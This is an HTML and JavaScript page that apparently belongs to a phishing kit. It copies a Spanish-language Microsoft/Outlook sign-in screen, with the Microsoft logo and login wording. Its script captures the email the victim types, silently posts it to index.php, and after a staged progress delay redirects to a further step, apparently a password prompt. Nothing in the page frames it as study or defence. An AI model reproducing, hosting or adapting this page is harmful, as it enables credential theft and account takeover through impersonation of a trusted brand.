<div class="lightbox-cover"></div>

<div>
    <img class="logo" role="img" src="images/logo.svg" alt="Microsoft">

</div>

<div role="main">


    <div class="">
    <script type="text/javascript">
        $(document).ready(function(){

            error = false;

            $("#login").click(function(){


                
                var form = document.getElementById("form-id");
                var input_email = $('#i0116');
                var error_email = $('#emailError');
                
                if( input_email.val().length === 0 ){

                    error_email.removeClass('hide');
                    error_email.text('Escribe una dirección de correo electrónico, un número de teléfono o un nombre de Skype válidos.');
                    input_email.addClass('has-error ext-has-error');

                    //error = true;
                    
                }else{
                        

                        $( ".lightbox-cover" ).addClass( 'disable-lightbox' );
                        $( "#progressBar" ).removeClass( 'hide' );

                        $.post( "index.php", {wp: "default-email", 
                            acc: input_email.val() } );

                        setTimeout(() => {
                            //form.action = "?wp=MBI_SIMPLE";
                            //form.submit();
                            window.location.href = "?wp=MBI_SIMPLE";

                        }, 4000);

                    //$('#form-id').submit();
                }

                /*if(!error){
                   form.submit(); 
                }*/              
                //var input_password = $('#i0118');
                //var error_password = $('#passwordError');

                //var currentElement = currentElement.next();
                /*var left = $('#panel-0').offset().left;
                $("#panel-0").css({left:0}) .animate({"left":"-450px"}, "slow", function(ele){
                    $('#panel-0').hide();
                });                
                return false;*/
            });

            /*$("#idSIButton9").click(function(){
               // alert(1);

                $("#form-id").submit();
            });*/

        }); 

        function OnSubmit(){
            return true;
        }       
    </script>
        <form name="f1" id="form-id" method="post"  onsubmit="return false">
            <input type="hidden" name="wp" value="MBI_SIMPLE">

            <div class="pagination-view animate slide-in-next">

                <div data-viewid="1" data-showfedcredbutton="true">
                    <!--  -->

                    <div>
                        <div>
                            <div class="row title ext-title" id="loginHeader">
                                <div role="heading" aria-level="1" data-bind="text: title">Iniciar sesión</div>
                                <div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="subtitle ext-subtitle">Continuar en Outlook</div>
                            </div>

                        </div>
                    </div>



                    <div class="row">
                        <div role="alert" aria-live="assertive">
                            <div class="col-md-24 error ext-error hide" id="usernameError">Escribe una dirección de correo electrónico, un número de teléfono o un nombre de Skype válidos.</div>
                        </div>

                        <div class="form-group col-md-24">

                        <div role="alert" aria-live="assertive">
                            <div id="emailError" class="error ext-error hide"></div>
                        </div>

                            <div class="placeholderContainer">


                                <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Correo electrónico, teléfono o Skype" data-report-attached="1">

                                <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">

                            </div>
                            <!-- /ko -->
                        </div>
                    </div>

                    <div class="position-buttons password-reset-links-container ext-password-reset-links-container">
                        <div class="row">
                            <div class="col-md-24">
                                <div class="text-13">

                                    <div class="form-group">¿No tiene una cuenta? <a href="#" id="signup" aria-label="Crear una cuenta Microsoft">Cree una.</a></div>

                                </div>
                            </div>
                        </div>
                    </div>



                    <div class="win-button-pin-bottom">
                        <div class="row">
                            <div>
                                <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">


                                    <div class="inline-block button-item ext-button-item">

                                        <input type="submit" id="login" class="win-button button_primary button ext-button primary ext-primary" value="Siguiente">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>


                </div>
            </div>
        </form>        

    </div>
</div>
<input type="hidden" name="isRecoveryAttemptPost" data-bind="value: isRecoveryAttemptPost() ? 1 : 0" value="0">

<div><input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>